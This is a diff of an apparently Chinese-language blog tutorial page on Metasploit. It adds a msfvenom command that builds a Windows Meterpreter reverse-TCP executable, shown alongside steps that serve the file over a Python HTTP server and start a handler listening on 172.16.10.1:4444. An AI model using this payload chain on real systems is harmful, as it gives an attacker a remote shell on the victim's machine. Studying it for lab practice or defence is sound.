@@ -124,9 +124,12 @@
 <li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l paloads</span><br></pre></td></tr></table></figure>
 <img src="https://i.loli.net/2020/04/01/jsk6CbwHfvJIpm4.jpg" alt=""></li>
 <li>找到“windows/meterpreter_reverse_tcp   Connect back to attacker and spawn a Meterpreter shell”<br><img src="https://i.loli.net/2020/04/01/1cXkTaqjMUDi8rO.jpg" alt=""></li>
-<li>保存在自定目录<br><img src="https://i.loli.net/2020/04/01/UmPZRQvthwy1jOX.jpg" alt=""><h1 id="在相应目录下打开http服务"><a href="#在相应目录下打开http服务" class="headerlink" title="在相应目录下打开http服务"></a>在相应目录下打开http服务</h1></li>
+<li>保存在自定目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter_reverse_tcp lhost&#x3D;攻击方ip lport&#x3D;反弹端口 -f exe -o ~&#x2F;tools&#x2F;test.exe</span><br><span class="line">-f：格式</span><br><span class="line">-o：路径</span><br></pre></td></tr></table></figure>
+
+</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/04/01/UmPZRQvthwy1jOX.jpg" alt=""></p>
+<h1 id="在相应目录下打开http服务"><a href="#在相应目录下打开http服务" class="headerlink" title="在相应目录下打开http服务"></a>在相应目录下打开http服务</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2020/04/01/gTbLBPYyvQUFtCj.jpg" alt=""><br><img src="https://i.loli.net/2020/04/01/zgDVnqlXukvjcR6.jpg" alt=""></p>
 <h1 id="msf开启监听-注意监听端口跟之前“生成shell-3-”中是否一致"><a href="#msf开启监听-注意监听端口跟之前“生成shell-3-”中是否一致" class="headerlink" title="msf开启监听(注意监听端口跟之前“生成shell-3.”中是否一致)"></a>msf开启监听(注意监听端口跟之前“生成shell-3.”中是否一致)</h1><ol>
 <li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -p windows&#x2F;meterpreter_reverse_tcp -H 172.16.10.1 -P 4444</span><br></pre></td></tr></table></figure>
